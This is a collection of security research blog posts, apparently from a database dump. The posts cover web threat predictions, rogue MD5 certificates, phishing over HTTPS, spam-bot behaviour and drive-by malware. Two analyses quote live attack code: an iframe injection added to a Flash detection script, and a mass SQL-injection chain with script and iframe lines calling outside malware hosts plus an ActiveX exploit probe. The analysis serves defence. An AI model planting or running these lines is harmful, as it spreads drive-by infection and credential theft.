browsers and servers and JavaScript was developed and adopted to extend the functionality of web browsers. The inventors did not however plan for a scenario whereby someone with less than honest intentions would leverage the power of JavaScript and browser/server trust (and lack of input validation) to attack unsuspecting users. Such attacks are not specific to any browser or server - all are affected equally as XSS abuses the infrastructure of the web not a specific vulnerability. We were provided with another example of this phenomena in 2008 when Clickjacking flew into the media spotlight. This time the attack focused on transparency and DHTML with a dash of social engineering to convince victims to make requests that they hadn\'t intended too. Expect such attacks to become the rule as opposed to the exception.    6.) Internet Explorer Gets Competition    We\'ve often argued that vulnerability statistics are a poor indicator of the relative security of a product. Rather than providing insight into the relative security of products, they tend to instead reveal the popularity of products. Attackers/researchers want the biggest bang for their buck. If they\'re going to spend time looking for vulnerabilities in a certain product, they\'re more likely to focus on the one with the largest user base. Internet Explorer (IE) has held the browser crown for several years now and that in our opinion is why it has tended to see a more significant number of vulnerability reports. The landscape is however beginning to change. Not only are mobile browsers starting to take off (see prediction #2) but there are some interesting new challengers in the market such as Google Chrome. While we don\'t expect Microsoft to fall from the pole position any time soon, we do expect the focus to shift to some of these new and intriguing entrants. Expect to see a decreased number of IE vulnerabilities in 2009 and more from mobile browsers and especially Google Chrome. While Google has a decent security track record, they haven\'t faced the same difficult but important learning curve climbed by Microsoft over the years. Browser development is also a different game than web application development, Google\'s forté, so expect some tarnish on the Chrome in \'09.    7.) Data Leakage Via The Web Reaches A Tipping Point    The Internet is converging on ports 80 and 443? Why? They\'re always accessible for outbound connections on corporate networks. Whether you\'re dealing with VoIP, P2P or malicious code, network aware applications are becoming increasingly intelligent. While they may initially attempt to connect via high-level ports using proprietary protocols for efficiency, they will often try a variety of approaches and ultimately regress to tunneling content through HTTP/HTTPS traffic. Combine this with the fact that users are increasingly encouraged to share content online (Facebook, Myspace, YouTube, etc.) and it\'s easy to see why data leakage via web channels is fast becoming a top priority for many enterprises. 2007 and 2008 were banner year for data leakage solutions in general (Vontu and Provilla acquired) but in 2009 the focus will shift to web based DLP.    8.) The Long Overdue Death of URL Filtering    Network administrators are finally starting to give up on managing web traffic through URL filtering. URL filtering is a dated technology, which tends to focus on blocking traffic at the domain level and leaves the administrator with a binary decision - allow or don\'t allow access to a given resource. This approach was reasonable when the web was dominated by static, corporate content. This is no longer the case. Today, content is extremely dynamic and often user generated and this changes the rules. A page that was good today may be bad tomorrow and while a domain such as Facebook.com may be perfectly acceptable, individual pages could contain objectionable or malicious content. In 2009, enterprises will seek solutions that support dynamic content filtering and page level reputation.    9.) Controlling Web Application Functionality, Not Just Content    It is no longer enough to block/allow access to sites. Administrators are demanding control over functionality, not just content. There may be perfectly legitimate reasons to permit access to a given resource but not want to permit specific functionality. Take YouTube for example. While it may be seen primarily as an entertainment site, many businesses have begun to leverage it as a marketing tool. If URL filtering is your only option for controlling access to YouTube (see prediction #8), you\'re stuck with allowing/disallowing access to the site as a whole. You may however wish to permit viewing videos to allow for competitive intelligence (or to avoid being the fun police) but not want to permit uploading content for fear of data leakage (see prediction #7). Administrators are increasingly demanding the ability to manage the - who, what, when, where and how much of web security. They want the granularity to determine that only the Marketing Department can upload videos during work hours to YouTube, so long as they don\'t use more that 5% of available bandwidth. Solutions need to understand not just the destination of a web request, but also the business logic of that destination in order to be able to permit the granular level of control required to manage third party web applications.    10.) Mobile Platforms Open Up For Developers…And Attackers    Desktops and mobile devices have evolved along nearly opposite paths - until now. Desktops have always been about an open architecture - you\'re free to add whatever applications you like, after all, you own it. Cell phones on the other hand have traditionally been black boxes - don\'t like a key feature? Buy a new phone. Much of this was driven by the control crazy mobile carriers who until recently have wielded the power. They didn\'t want you to be able to add features, as it would then be harder for them to differentiate their \'exclusive\' handset offerings. This has changed however as device manufacturers have begun calling the shots and the carriers are now tripping over one another to argue about who is the most \'open\'. While this overall is a positive thing, it does have security implications. The more freedom that you provide someone with the more likely that freedom will be abused. Providers are taking different approaches to an \'open\' model. Apple for example allows you to install whatever you want, so long as they approve of it. Are they however, assessing submitted applications for security weaknesses, or just undesirable functionality? We suspect it\'s the later. Google on the other hand is taking a more \'pure\' open source approach and not locking down as many portions of the O/S for developers. Will attackers abuse these new open platforms? You bet.', 'Analysis', 'https://www.zscaler.com/blogs/research/2009-web-security-predictions');

On December 30, 2008 at the 25th Chaos Communication Congress (CCC) in Berlin, seven researchers presented a talk entitled \'MD5 Considered Harmful Today: Creating a Rogue CA Certificate\'. In essence, they made the theoretical practical by building on recent research which detailed how chosen-prefix collisions for MD5 could be used to create two x.509 certificates with identical signatures despite having different content. The CCC presentation has taken this work a step further to actually produce an intermediate CA certificate signed by a trusted root CA. This certificate can then be used sign any website certificate. A website certificate created by the team can be seen in the image below. Note that Internet Explorer in this case considers the certificate to be legitimate.    As you can imagine, the ability to create fake SSL certificates is a phisher\'s dream come true. An attacker possessing such a rogue certificate could produce fake SSL certificates for phishing sites which would be indistinguishable from their legitimate counterparts. However, before we conclude that the sky is falling it\'s important to understand that while such attacks have now been proven to be possible, it would still be difficult to an attacker to successfully mount a successful attack.    Ingredients For a Successful Attack    1.) Knowledge - While the CCC researchers have published a detailed paper to discuss their findings, they will thankfully \"for the time being not release the full details of how [they] have been able to obtain the rogue Certification Authority certificate\". While their research is based on past work that is now public, they confess that the \"publicly known techniques have been improved at crucial points\". In short - simply reading their paper/slides will not be enough to conduct a successful attack, additional research would be required. That said, you can bet that the race is now on for the bad guys.    2.) Computing Power - In order to calculate the MD5 hash collisions to produce the rogue CA certificate, the team employed a cluster of 200 PlayStation 3 consoles. While such technology is readily available, there is a real cost associated with acquiring the necessary computing power to replicate their work.    3.) Traffic Redirection - This is the biggie. Producing a rogue SSL certificate for say bankofamerica.com is of little value if it is not hosted at bankofamerica.com. Hosting the certificate at any other domain will result in a warning message from any visiting web browser indicating that the certificate does not match the domain name. The necessary traffic redirection is realistic on a LAN segment, but would be very difficult to accomplish on the Internet as a whole. Attacks such as Dan Kaminsky\'s DNS cache poisioning attack would provide the critical missing piece of the puzzle but fortunately this vulnerability has aged to the point where it has primarily been addressed.    Why This Was Possible    The CCC researchers largely credit the work of Marc Stevens , Arjen Lenstra and Benne de Weger on chosen-prefix collisions for MD5 which was released in 2007. However, their success was also made easier by less than perfect processes at a number of Certificate Authorities. Certificates do not have to be signed using MD5. In fact, MD5 was shown to be vulnerable to attack as early as 2004 and yet a number CAs still employ MD5 for certificate signatures. The worst offender turned out to be RapidSSL (owned by VeriSign), which was responsible for 97% of the MD5 signed certificates that the researchers looked at. The team also faced other challenges such as predicting the validity period and serial numbers of the certificates issued by the CA that was being targeted. This was made much easier by the fact that certain CAs are apparently using sequential serial numbers.    What Needs To Be Done    So, what can you do to protect your users from falling victim to phishing attacks on sites that may have rogue certificates? Unfortunately, there isn\'t a good answer to that question. If someone were to successfully create a rogue certificate it would be difficult evn with manual inspection to identify it as rogue. The researchers took the approach of developing an intermediate CA certificate which could then be used to sign any website certificate, therefore you could identify/block any web certificates signed by an intermediate CA which is not specifically trusted but that could also block some legitimate sites. It should be noted that it is not enough to block sites with MD5 signed certificates (unless MD5 was not used for signing at any point in the chain of trust). While MD5 collisions were used to develop the rogue CA certificate, once it is developed, MD5 does not need to be used for signing subsequent website certificates.    The fix really lies with the CAs. The fact that some have continued to use MD5 instead of a more secure alternative such as SHA-2 for signing certificates some four years after real weaknesses in the algorithm were demonstrated, is inexcusable. They also need to inject randomness into the signature generation process, most notably in the serial number field. Hopefully this research will force CAs to quickly phase out the use of MD5 for developing certificate signatures and improve their procedures overall.

According to their stats, Microsoft Internet Explorer (MSIE) browser has finally dropped below 70% of the overall browser market share, and Firefox has risen above 20%.\r\n\r\nOverall, this is nice for Firefox and alternative browsers, but it does have both positive and negative security implications. For a period of time, it felt like the world wide web was a homogenous environment of MSIE browsers everywhere (and before that, it was Netscape browsers). Now we\'re finally at a point where the numbers may start supporting the notion that we have a true heterogeneous environment blossoming. Heterogeneous environments, whether it be a computer network or a biological system, are often much more robust and stable than a homogeneous environment simply because a homogeneous environment is susceptible to a single incident (such as an eruption of a pathogen, or a browser exploit in our case) wiping out the entire environment in one fell swoop. So the growth of browser alternatives is actually good for web browser security overall, because it means not all systems will be p0wn3d by the next devastating MSIE vulnerability.\r\n\r\nThere is also a downside of this too. With the rise of active use of alternative browsers, there is now enough incentive for attackers to take the time to attack/exploit the alternatives. We kind of already knew this, and it was largely already happening in the real world, but the numbers help to support the idea. Simply put: if no one is using a browser, there isn’t much blackhat value in finding a vulnerability in it to exploit...you’d essentially have a specialized weapon with a lack of targets to use it upon. But once there is a moderate/sizable population of those targets, the effectiveness of that specialized weapon (i.e. exploit) increases. We’ve seen this before with the Apple Mac platform: many people claimed it was more secure than Windows because it had fewer publicized security vulnerabilities. There\'s even the claim that Macs don\'t need anti-virus software because there are no viruses for Macs. Of course, Mac popularity grew, the number of deployed systems rose, and that caused the attackers to take notice. Now we have active research and exploitation of OSX and its components, and a host of malware specific to the Mac platform (for the skeptical: OSX.Leap.A, OSX.Exploit.Launchd, OSX.Macarena, OSX.Inqtana.A, etc.)\r\n\r\nOverall this is the right direction for things to be heading. However, those trying to fly under the blackhats\' web exploitation radars by using an alternative/obscure browser may find their days of obfuscated safety are numbered. As soon as the obscure browser you are using jumps into the limelight, attackers are sure to pounce on it eventually as well.\r\n\r\nSide note: I\'ve encountered many individuals that have employed this \'security through obscure browser\' tactic. The issue is that they were using browsers like Maxthon, NeoPlanet, Avant, etc. What they didn\'t realize is that all of these browsers were just different UI shells on top of the MSIE web layout engine (called \'Trident\'). In other words, they often just as vulnerable as if they were directly running MSIE—there was no security advantage gained. Overall there currently four major web browser \'engines\': Trident (MSIE), Gecko (Firefox), WebKit (Safari), and Presto (Opera). Most browsers on the market today use one of those engines (or a derivative), and that means any vulnerability that affects the engine will affect any browser built upon it. So you might hear of a vulnerability in Firefox, but the bug could truly be in the Gecko engine and thus other browsers like Flock, Camino, Epiphany, Galeon, SeaMonkey, and Songbird (all Gecko-based) could be vulnerable as well. Therefore if you are looking to differentiate yourself by using an obscure browser for security purposes, you should do some research to ensure the browser you are running is not running the same (vulnerable) web engine as the more popular browsers.\r\n\r\nUntil next time,\r\n- Jeff', 'Microsoft', 'https://www.zscaler.com/blogs/research/microsoft-internet-explorer-dips-below-70-market-share');

If you don’t get the print magazine, you can take the quiz online too.Overall the quiz is basic, but that’s acceptable given the target audience (general consumers). It\'s nice to see articles like this, as consumer education about security threats still has a long way to go (but we\'re making good progress: most consumers now know, even if they do not understand why, that they need some kind of anti-virus protection on their systems). There was, however, one question that made me cringe a little.The question was whether using HTTPS was a good or bad thing, and Money\'s response was that it was a good thing assuming the SSL certificate is valid (which they explain as the little lock icon in the browser not reporting any problems). In other words, if the URL is using HTTPS, and the certificate is good, then don\'t worry--you\'re safe. This is actually a bit misleading.In this day in age, basic SSL certs are tied to hostnames (or, in the case of wildcard SSL certs, root domain names). The process of vetting SSL cert recipients has diminished over the years; nowadays you can be immediately issued a domain-only SSL cert if you control the web server for that domain. In fact, this diminished accountability for normal SSL certs is one of the reasons for the introduction of the newer crop of EV (Extended Validation) SSL certs (a.k.a. the \'green bar\' SSL certificates). EV SSL certs (re-)establish a level of recipient review and validation.Anyways, let\'s bring this back to phishing. Money magazine says that a valid HTTPS cert means things are OK. But what\'s to stop a phisher using \'www.evil.com\' from getting a valid SSL cert for that hostname? Absolutely nothing, other than the financial cost acting as a barrier to entry. But domain-only SSL certs are now as cheap as US$15, and I have to imagine such a cost is negligible if the phishing site has even a minimum level of success. Sure, phishers treat their sites as disposable, and buying a new SSL certificate for every site could become expensive; but if valid HTTPS connections contribute to the success of the phishing attack, then there might justifiable ROI. At that point, the SSL cert is just a cost of doing business for the phisher (or, as I like to refer to it, a \'cost of doing evil\').But let\'s take this one step further. Getting an SSL certificate for www.evil.com has minimal value, because it is very clearly evident that www.evil.com is not a possible phishing target, such as www.paypal.com. And perhaps every certificate authority (CA, the people who sell SSL certs) in the world checks and denies SSL certificate requests that include derivations of the word \'paypal\' in their SSL certificate requests...although that is highly doubtful. But even if they did, wildcard SSL certificates can bypass this check to a certain degree. An attacker would just purchase a \'*.evil.com\' wildcard certificate from the CA, and then set up a site such as \'paypal.evil.com\'. The CA would never know the final hostname in use. Does the hostname still look suspicious? What if the attacker gets the domain name \'cgi-bin-webscr.com\', and requests a wildcard certificate for \'*.com.cgi-bin-webscr.com\'? The SSL-validated URL \"https://paypal.com.cgi-bin-webscr.com/?cmd=login\" could look convincing to some folks...And just for fun, I took at look at all of the reported phishing sites on Phishtank.com for the past month. There was only one site using HTTPS; it was posing as an eBay site, and it did, in fact, have a valid SSL certificate issued for the phishing domain name. So this discussion isn\'t speculation...it\'s actually occuring.Overall, the mere presence of a valid SSL certificate does not imply a safe site. You could, in fact, be (securely) talking to an attacker. EV SSL efforts help with this situation, but they are cost-prohibitive for many sites and will take a long time before the majority of the world is using them (if ever). So end users must still remain vigilant about verifying which sites they are visiting...and the presence or absence of a standard valid HTTPS/SSL certificate is a negligible factor in that process.Until next time,- Jeff', 'Encryption', 'https://www.zscaler.com/blogs/research/money-magazines-take-phishing');

Many of these have been publicly discussed already, but they still are worth repeating. Also, note that none of these techniques provide a permanent, fool-proof way to stop spam apps. These suggestions will curb the tide of comment spam that is being spewed by today’s spam apps--but tomorrow\'s spam apps, if adapted, would be able to circumvent these mechanisms. Anyways, onto the mechanisms.  Use Javascript  All of the spam apps I\'ve encountered to date do not run Javascript. So you should utilize some Javascript mechanism to manipulate the form before it is submitted. You can dynamically change the form action URL upon loading or submission, update the value of a hidden field to indicate Javascript is present and functioning, etc. Any submission to the wrong form action URL or without the proper hidden field value should be discarded.    The downside of this approach is that it requires the user to have Javascript enabled in their browser. While Javascript is mostly ubiquitous in the Web 2.0 world we live in, browser plugins like NoScript are still highly popular. So you have to make the executive decision on whether you want to require your users to enable Javascript to use your form...which might not be a problem if you already require it for other things (i.e. Web 2.0 elements in use on your site).    Monitor the time it takes to fill out the form  My simple experiment kept track of the time between when a spam app requested the form to when the form was submitted. What I saw was that the form submission was done immediately. There is no way a human would be able to reasonably fill out the fields of the form in under, say, two seconds. This provides a simple way to discard spam simply by keeping track of when the form was requested (via a time value stored in server-side session storage or within a hidden form field) and when the form was received by submission (compare current time with previously stored time).    Now sure, spam apps can get around this by slowing down a bit during the form submission process. But since these apps are trying to spew out tens/hundreds of thousands of spammy form submissions, requiring each submission to slow down causes significant time overhead for the user of the spam app. Are they willing to be patient and wait 10 times longer for their spams to be submitted?    Use CSS to hide some form fields  The spam apps liked to populate every text input field in the form with some kind of value. You can wrap a field in a HTML DIV with a CSS style set to \'display:none\', which essentially makes the field invisible. Normal CSS-capable web browsers will not display the field, so the user will never get a chance to enter input data into it. But the spam applications do not account for the hidden DIV, and thus will treat it like any other field on the form (and input a value). Thus all you need to do is see if that invisible form field contains a value upon submission, and if so, discard the submission. For safety, put a nice warning (also in the DIV) to users that they should not fill out the field if they see it; that way, if for some reason a user has a browser which is not CSS-compliant, they are still prompted to leave the field blank.    Textarea input field in HTML comments  I noticed one of the spam apps that hit my form just couldn\'t resist the temptation of populating data into a textarea input field that was within HTML comments. Normal browsers will ignore everything in comments, including the erroneous textarea field; so any submissions that include that field should be discarded as spam.    Don\'t use obvious form field names  Avoid using the field name \'email\' for a user\'s email address, etc. In fact, you can turn this to your advantage: have the email field be named \'foo\' or something else innocuous, and then check upon submission that the \'foo\' field data format matches the format of an email address (which is typically done for validation purposes anyways). Since the spam apps often shove random garbage into fields they do not understand, you can discard any submission that does not contain what looks like an email address in the \'foo\' field. Alternatives include checking numeric format in postal code or phone number fields, etc.    Overall, these few simple tricks can help you alleviate the flood of web comment spam that your site might be experiencing. They may not be perfect, but they are simpler to implement than a CAPTCHA and do provide some value from the current crop of web comment spam apps that are roaming the Internet. Every little bit helps.    Until next time,    - Jeff', 'Spam', 'https://www.zscaler.com/blogs/research/final-encounters-web-comment-spammer');

Sometimes we do this out of fear. After all, if we get involved, we too could get hurt. Other times however, we are just as much to blame as the guilty parties perpetrating the crime. We choose not to get involved because we too profit from the crime, although we do so passively and leverage that as our defense.    A couple of years ago, I drew attention to the fact that free website providers were profiting from allowing phishers to set up shop and doing nothing to stop them. They were profiting as they make money from ad-supported pages. The more traffic they generate, the more money they make and how that traffic is generated doesn’t seem to be of concern. I ruffled a few feathers by speaking my mind and generated a much-needed debate on the issue. The argument from the hosting providers was that they try very hard but some pages slip through the cracks. Although I don’t buy the excuse, to be fair, automating the detection of phishing pages isn’t without challenges. What about malware then? Do these same sites foot the bill for hosting/delivering malicious binaries? Sadly, the answer is yes.    Being an ‘in-the cloud’ security solution, our Zscaler infrastructure permits powerful data-mining capabilities from a research perspective. The very nature of a cloud architecture means that logs can be centralized, providing a powerful view into global attacks. Leveraging this capability, I sought to identify malware being hosted on free web sites. It didn’t turn out to be much of a challenge as evidence was everywhere. A sample of what was discovered can be seen below:    Caution: At the time of this blog post, these URLs were live and hosting malware – proceed at your own risk.

In every case at least 20+ commonly available AV scanners detected the malicious content and in some cases the malware was years old! This isn’t just incompetence, it’s gross negligence.    So why then wouldn’t they make an effort to eradicate viruses from their servers? The answer is simple. The cost to do so outweighs the benefits derived. In other words, removing content from their sites reduces the number of eyeballs they receive and in turn decreases ad revenue. They are turning a blind eye to the fact that their users are getting infected with malware.    Gross negligence can be defined as “failure to use even the slightest amount of care in a way that shows recklessness or willful disregard for the safety of others”...sounds like an open and shut case to me.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/turning-blind-eye');

I set up a bit of an agility test for the bots to figure out what they were, and were not, capable of doing. Eventually I was able to put together a fairly good operational profile of one of the spam application\'s functionality. In this post, I want to review the operation of another spam application that I happen to encounter during my test...one that seems far more capable than the original one I aimed to report on.    To briefly recap my previous two articles, there was one particular application that repeatedly kept visiting my site. It should send a bunch of bogus links in various different formats as a comment in a web form; since the links were entirely random, I hypothesized that these submissions were mere probes to some other future means and not the overall end purpose. Anyways, the operational profile that I constructed for the application looks like:                	It recognized a few form field names and attempted to submit appropriately formatted data to them, but all other fields were filled with random garbage (unless an existing form field already held a value); specifically:  	  		It put an email address in the \'email\' field, but not the \'eml\' field  		  		It put a URL in the \'url\' field, but not the \'link\' field  		  		It did nothing special with the name, address, and phone fields  	  	  	  	It supported cookies during the submission process  	  	It did not support Javascript  	  	Hidden form fields were properly submitted/included  	  	It could support multi-step submissions  	  	The User-Agent seems configurable, but is mostly left as the same value  	  	Many uses of this application against my site have originated from the same Class C public Internet network  	  	  	       During my experiment, another spam application wandered onto my site and partook in my little agility test. This particular application stood out exceptionally different than the previously profiled application. Here’s an example of what the application actually sent (which can be compared against the raw data contained in my previous post). I’ve modified the domain names; I assure you the originals used live/real URLs.    eml: korch_poposk@xxx.yy    email: korch_poposk@xxx.yy    name: DoorieHoohona    phone: 123456    address: http://xxx.yyy.com/Avalide/map.html    url: http://xxx.yyy.com/Bust-Enhancer/map.html    link: http://xxx.yyy.com/L-Glutamine/map.html    comment: Wellbutrin XL what is celebrex clonidine medicine bupropion and weight loss <a href=http://xxx.yyy.com/Female-Libido-Patch/new-scientist.html>new scientist</a> <a href=http://xxx.yyy.com/Evegen/evegen-reviews.html>evegen reviews</a>... [truncated for brevity]    Just looking at the values submitted in these fields, there is a night-and-day difference when compared to the previously mentioned spam application I was tracking. This new application was significantly more successful at putting contextually-correct information in the right fields: email addresses were submitted for both \'email\' and \'eml\' fields; something that resembled an actual human name was submitted in \'name\' field; the \'phone\' field was numeric; both \'link\' and \'url\' fields held URLs. The value of the \'address\' field is debatable...perhaps the application is coded to believe \'address\' is akin to a web site address, i.e. URL. Or, maybe this particular app shoves URLs into fields it does not recognize (and thus the URL values in the \'address\', \'url\', and \'link\' fields were actually just dumb luck). The links submitted within the comment only used one format (proper HTML <A> tag), so it\'s not as robust as the other application in abusing web applications that allow the use of popular forum code markup (i.e. the [url] and [link] pseudo-tags). But overall, the level of contextual awareness of this application is far more interesting than the previously profiled spam application.    So the current operational profile of this spam application is:                     	It has shown to be very successful at putting the right contextual/formatted information into a variety of different form fields; specifically:  	  		It put email addresses into the \'email\' and \'eml\' fields  		  		It put a human name into the \'name\' field  		  		It put a numeric number into the \'phone\' field  		  		It put URLs into the \'address\', \'url\', and \'link\' fields  		  		  		   	  	  	It supported cookies during the submission process  	  	It did not support Javascript  	  	Hidden form fields were properly submitted/included  	  	The application does not appear to support multi-step submissions; or at least, it didn\'t care about verifying that the submission worked  	  	The User-Agent string submitted is extremely easy to spot: \"Mozilla/4.0 (compatible; MSIE 6.0; Update a; AOL 6.0; Windows 98)\"        Unfortunately this particular application only visited my site once, so I don\'t have multiple submissions at hand to aggregate into a more comprehensive profile.

These new ones exhibit different behavior than the original one I reported on, thus I believe they are entirely different applications. For now, I’m going to stick to the original application I previously discussed; I\'ll compare my results to these newer spam apps in a future blog post.One thing I noticed is that many of these comment spam attempts were coming from systems located on the 94.102.60.0/24 network. A large number of them were also using the User-Agent string \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\". Both of these factors turned out to be good indicators of whether the request was coming from a spam bot.Anyways, here is an example of one submission I received. The names at the beginning of each line are the name of the form field; all of the fields are text input fields (as in, \"<input type=text>\"), except for \'other\' and \'comment\' which are textarea fields.eml: YkfxeDeZjHRemail: fbkixy@nphddy.comname: fvkijvnphone: CdGpbMFbxGDygCwyaddress: ouUMHxpoxwnurl: http://vfokgivkywst.com/link: geEKiJfvkyRCother: TyhYgb <a href=\"http://xnhqpiemubkx.com/\">xnhqpiemubkx</a>, [url=http://fiukrdabbaut.com/]fiukrdabbaut[/url], [link=http://zrywxdmvlfzv.com/]zrywxdmvlfzv[/link], http://klhtciqjlkxr.com/comment: TyhYgb <a href=\"http://xnhqpiemubkx.com/\">xnhqpiemubkx</a>, [url=http://fiukrdabbaut.com/]fiukrdabbaut[/url], [link=http://zrywxdmvlfzv.com/]zrywxdmvlfzv[/link], http://klhtciqjlkxr.com/The most obvious things visible from this data are that the application filled in all fields with random garbage. It managed to put something that resembled an email address into the \'email\' field, but not the \'eml\' field (which is the actual email address field shown to the user for data entry). The application also managed to put a URL into the \'url\' field, but not the \'link\' field. This makes me believe the application is pre-programmed with a few specific field names where it will submit data of a specific format. Also interesting/notable is that the application submitted the same blob of link garbage to both textarea fields (\'other\' and \'comment\'), and not any of the text input fields.In addition to the form fields that were submitted, I collected some other pieces of information to gauge the depth of the spamming application. I discovered that cookies were indeed supported--at least, I could set a cookie on the form display page and the bot would carry that cookie over with the form submission. Hidden form fields were not altered and properly submitted with the rest of the form data. I also found that Javascript is not supported by the application...which is no surprise.Another thing I failed to notice before is that the application does actually have the ability to handle multi-step submissions. I recognized the behavior in my logs: whenever the form was submitted, the same user-agent would then go through every link on the page (in exact order of appearance, none-the-less) and subsequently request it. I assume this behavior is to deal with web applications that return a \"thank you for your submission\" page along with a link taking you back to the forum/comment area where the new submission will appear.Interesting info, perhaps. But I’ve found that I grown bored with this particular application and its lack of intelligence; the newer bots I’ve been seeing have actually been doing a lot more interesting things. I will take a deeper look at these new bots, and how they differ, in my next blog post.

So what I wound up doing was go into the config/ directory and copy the \'Linux-All.mk\' file to \'FreeBSD6.2-RELEASE.mk\'.If we were building on an x86 (32-bit) FreeBSD platform, that might be all we need to do. However, since we\'re building on AMD64 (64-bit), this configuration file needs to be modified because the default Linux configuration file references 64-bit CPU architecture as \'x86_64\'; on FreeBSD AMD64, the CPU architecture is reported as \'amd64\'. Fortunately the fix is simple: just do a find/replace on all values of \'x86_64\' and change them to \'amd64\'. There are three changes total.Now that you\'ve made those changes, you should be all set. Just build the application (\"gmake –f Makefile.ref\") and then grab the \'js\' binary out of the \'FreeBSD6.2-RELEASE_DBG.OBJ/\' directory.Enjoy.- Jeff', 'Analysis', 'https://www.zscaler.com/blogs/research/technical-quickie-building-spidermonkey-freebsd-62-amd64');

I thought I\'d take a moment to discuss a trend we\'re seeing in attacker tactics, and predict how it may evolve into what will become commonplace tomorrow.    Recently we ran across a modified version of Adobe\'s Javascript-based Flash detection script used as part of a drive-by attack on web browsers. Basically the malware writers took the Flash Player Version Detection v1.7 script (AC_RunActiveContent.js) and tweaked it with a malicious payload. The heart of the evilness was caused simply adding one line, towards the end of the script:        document.write(\"<i\"+\"fr\"+\"ame    src=\'http://__someplace__.com/    pdfdoc/index.php?id=com2\'    width=1 height=1></ifr\"+\"am\"+\"e>\");         This causes the script to write out an IFrame tag that pointed to a malware site which then tried to deliver exploits to the browser in an attempt to cause arbitrary code execution.    I\'m willing to speculate that anyone doing a shallow/naive review of the script could prematurely conclude that the script is the proper Adobe Flash detection script and thus dismiss it as non-evil. Hopefully though many investigators would plow through the entire file and eventually see the plain-as-day extra IFrame code added, and thus see through the facade.    However, what if the IFrame code wasn’t easily visible? Javascript \'packers\' (programs that transform the Javascript code into smaller, more concise code) are becoming the norm on the web for slimming down Javascript code and saving some transfer bandwidth. They work by rewriting the code and essentially obfuscate what is going on as a byproduct. This can make it much more difficult to understand what the Javascript code is doing simply by casually perusing it; a simple Javascript \'document.write\' of a malicious IFrame tag may not be so glaringly obvious anymore. And unfortunately, unlike executable (.EXE) packers such as UPX, the Javascript packers are used by many web sites and projects for legitimate reasons...so the mere presence of a packed Javascript file isn\'t an immediate red flag of its malicious intent (i.e. alerting on packed Javascript files is going to result in a lot of false positives).    How does this help attackers? Well, even though alerting on every packed Javascript file is not recommended, packing should still at least raise the suspicion level. An attacker taking their \'evil.js\' file and packing it might obfuscate what evil.js is doing, but the fact that it\'s a packed file of unknown function may still cause people to investigate. Instead, an attacker can extend the previously mentioned tactic of hiding a malicious payload inside a legitimate Javascript library...but this time, pick a library that is commonly distributed in packed form and widely used. For example, we see packed versions of the JQuery Javascript library quite often on many different sites. A clever attacker could take the (unpacked) jquery.js file, insert their malicious code, pack it using the same packer normally seen used with jquery.js, and then deploy it. Anyone encountering this malicious file, at first glance, may consider it to just be the usual packed jquery.js file and ignore it; any automated signatures meant to flag packed Javascript files would, on the surface, not really differentiate between the packed original version and the packed modified version. And any advanced investigation into the file by looking at the code\'s behavior (or \'unpacking\' it via various means) will, at first, just seem to be the standard set of JQuery functionality. Only those who continue to persist past all the obvious signs that the file is a legitimate jquery.js Javascript file would perhaps encounter the maliciousness of this web 2.0 Trojan horse.         Fortunately there is a workable solution to this problem: whitelists of known-good Javascript file hashes. Since the obvious targets are widely-deployed Web 2.0 Javascript libraries (JQuery, Dojo, SWFObject, Prototype, etc.) it would be feasible to construct a whitelist of the true/safe versions of these popular library files. Of course, maintaining a whitelist is a time-consuming effort, especially with new versions of each library coming out so often. And site designers would need to be encouraged to not make any personalizations/modifications directly to these standard library files, lest they trigger the alarms. It would be interesting if such a whitelist was then utilized by browser extensions such as NoScript to know automatically which Javascript files are safe to execute...but vetting the function library is a minor part of the problem since the site still needs to use custom Javascript to access/utilize the library in the first place.    It’s a hard problem still looking for a perfect solution (like many other security problems).

Such attacks are quickly becoming a preferred attack vector as they permit mass infection with minimal effort. We\'ve seen this before, and not just once. In fact, it seems to be popular among Chinese hackers and is often used to gather authentication credentials for online games. While it hasn\'t yet been verified, it appears that SQL injection vulnerabilities on vulnerable servers led to the initial infection. All infected servers seem to be running Microsoft ASP pages, a common target for those seeking sites vulnerable to SQL injection.    I\'m fascinated by such attacks as they illustrate the interconnected nature of the web and shatter the myth that you are safe if you stick to browsing reputable sites. Sadly, reputable sites struggle with vulnerabilities on a regular basis. The unfortunate reality is that any site, no matter how big or small, could be infected. In this latest attack, Travelocity was compromised. While vulnerable servers were infected, the true targets of these attacks are the end users which visit the sites. I\'ve been preaching for some time now that we need to shift our focus from servers to browsers. We spend the majority of our security resources locking down servers and put minimal effort into protecting users browsing the web. Attackers have shifted their focus and we must do the same.    Attack Walk-Through    According to Kaspersky, the attack leverages multiple browser vulnerabilities and a variety of sites to host the attack scripts and malicious code. In order to better understand how these attacks succeed, let\'s walk through one such attack scenario which was live at the time this blog was written:    Step 1 - Server Infection    The attack begins by injecting code onto as many vulnerable web servers as possible. This is commonly accomplished via SQL injection. In this specific example, the following code was injected:    <script src=\"http://dbios.org/h.js\">    This code won\'t change the appearance of the page, so a victim has no way of knowing that the so-called reputable page, is actually launching an attack on his browser. A quick Google search illustrates the mass nature of the attack and reveals that many sites are still infected.    Step 2 - Redirects    The initial JavaScript file typically doesn\'t contain the ultimate attack, but rather calls a variety of other scripts from different locations. This may be done in part to obfuscate the attack but is more likely done simply to accommodate multiple vulnerabilities and download sites in order to make the attack more robust and reach as many potential victims as possible. In our case, the following two IFRAMEs are added to the page:    document.write(\"<iframe width=\'20\' height=\'0\' src=\'http://vvexe.com/haha/index.html\'></iframe>\");  document.write(\"<iframe width=\'0\' height=\'0\' src=\'http://www.kenya.com/faq.htm\'></iframe>\");    Kasperky discusses that this latest round targets a variety of vulnerabilities in web browsers and Maromedia Flash Player. In our example, the exploitation is going after a vulnerability in the Snapshot Viewer for Microsoft Access ActiveX control, published on August 12, 2008 and detailed in MS08-041. One of the IFRAMEs contains code which attempts to instantiate the Snapshot Viewer ActiveX control as shown below:    try{var n;  var ll=new ActiveXObject(\"snpvw.Snapshot Viewer Control.1\");}  catch(n){};  finally{if(n!=\"[object Error]\"){document.write(\"(\"<iframe width=50 height=0 src=ff.htm></iframe>\");}}    As can be seen, if the ActiveX control is indeed accessible, the browser then opens yet another IFRAME from http://vvexe.com/haha/ff.htm and this is where the attack actually lies. The writers of this exploit are either not particularly skilled or just lazy as they\'ve simply leveraged an already public exploit line for line and simply changed the target download to http://ip.kanlang.com/haha/down.exe.    Step 4 - Client Infection    The down.exe executable is a Trojan, which goes by various aliases, including Infostealer.Wowcraft. The Trojan serves as a keylogger and is designed to harvest and transmit authentication credentials for World of Warcraft.    Lessons Learned      	Surfing \'reputable sites\' is not 